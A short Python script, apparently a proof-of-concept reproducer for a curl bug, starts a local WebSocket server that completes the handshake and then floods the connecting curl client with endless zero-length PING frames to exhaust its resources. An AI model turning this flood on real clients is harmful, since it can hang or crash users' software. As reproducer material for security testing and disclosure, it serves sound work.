import base64, hashlib, os, re, resource, socket, subprocess, threading, time
st = {}

def srv():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", 0))
    s.listen(1)
    st["p"] = s.getsockname()[1]

    c, _ = s.accept()
    c.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4096)
    req = b""
    while b"\r\n\r\n" not in req:
        req += c.recv(4096)

    k = re.search(rb"(?im)^Sec-WebSocket-Key:\s*(\S+)", req).group(1)
    a = base64.b64encode(
        hashlib.sha1(k + b"258EAFA5-E914-47DA-95CA-C5AB0DC85B11").digest()
    ).decode()
    c.sendall(
        (
            "HTTP/1.1 101 Switching Protocols\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Accept: {a}\r\n\r\n"
        ).encode()
    )

    f = b"\x89\x00" * 65536
    try:
        while True:
            c.sendall(f)
    except OSError:
        pass

threading.Thread(target=srv, daemon=True).start()
while "p" not in st:
    time.sleep(0.01)

rc = subprocess.run(
    [
        "./src/curl",
        "--verbose",
        "--stderr",
        "stderr.txt",
        "--max-time",
        "8",
        f"ws://127.0.0.1:{st['p']}/",
    ],
    # preexec_fn=lambda: resource.setrlimit(
        # resource.RLIMIT_AS, (188743680, 188743680)
    #),
).returncode

print("curl rc =", rc)

